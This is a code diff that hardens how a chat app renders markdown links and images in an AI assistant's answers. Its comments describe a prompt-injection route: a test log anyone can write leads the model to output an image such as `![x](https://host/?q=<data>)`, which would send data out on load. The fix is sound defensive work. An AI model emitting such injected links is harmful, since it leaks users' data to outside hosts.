@@ -11,7 +11,32 @@ import ReactMarkdown from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import { Link } from 'react-router-dom'
 
+import { DEFAULT_RETURN_PATH, returnPathFromString } from '@/utils/returnPath'
+import { isSafeExternalUrl } from '@/utils/safeUrl'
+
 type Children = { children?: React.ReactNode }
+
+const LINK_CLASS = 'text-[var(--color-accent)] underline underline-offset-2'
+
+// A link in an answer is model output, and the model reads test logs anyone can
+// write. An address that is not a safe http(s) URL is shown as plain text, and a
+// link that leaves the app names its host, so the link text cannot hide where it
+// goes (security audit 2026-11-18).
+function externalLink(href: string | undefined, label: React.ReactNode, testId?: string) {
+  if (!isSafeExternalUrl(href)) return <span>{label}</span>
+  return (
+    <a href={href} target="_blank" rel="noreferrer noopener" data-testid={testId} className={LINK_CLASS}>
+      {label} <span className="text-xs text-[var(--color-text-muted)]">({new URL(href).host})</span>
+    </a>
+  )
+}
+
+// An in-app path starts with one "/". "//host" and "/\host" leave the app, so the
+// path goes through the same check as the sign-in return path before the router.
+function inAppPath(href: string | undefined): string | null {
+  const path = returnPathFromString(href)
+  return path !== DEFAULT_RETURN_PATH || href?.startsWith(DEFAULT_RETURN_PATH) ? path : null
+}
 
 const COMPONENTS = {
   p: (p: Children) => <p className="mb-2 last:mb-0 leading-relaxed">{p.children}</p>,
@@ -46,25 +71,11 @@ const COMPONENTS = {
   // URL that an injected test log asked for (`![x](https://host/?q=<data>)`), and
   // loading it would send that data out without a click (OSS review 2026-11-12).
   img: (p: { src?: string; alt?: string }) =>
-    p.src ? (
-      <a
-        href={p.src}
-        target="_blank"
-        rel="noreferrer noopener"
-        data-testid="chat-image-link"
-        className="text-[var(--color-accent)] underline underline-offset-2"
-      >
-        {p.alt ? `Image: ${p.alt}` : p.src}
-      </a>
-    ) : null,
-  a: (p: { href?: string; children?: React.ReactNode }) =>
-    p.href?.startsWith('/') ? (
-      <Link to={p.href} className="text-[var(--color-accent)] underline underline-offset-2">{p.children}</Link>
-    ) : (
-      <a href={p.href} target="_blank" rel="noreferrer noopener" className="text-[var(--color-accent)] underline underline-offset-2">
-        {p.children}
-      </a>
-    ),
+    p.src ? externalLink(p.src, p.alt ? `Image: ${p.alt}` : p.src, 'chat-image-link') : null,
+  a: (p: { href?: string; children?: React.ReactNode }) => {
+    const path = inAppPath(p.href)
+    return path ? <Link to={path} className={LINK_CLASS}>{p.children}</Link> : externalLink(p.href, p.children)
+  },
 }
 
 function ChatMarkdown({ text }: { text: string }) {
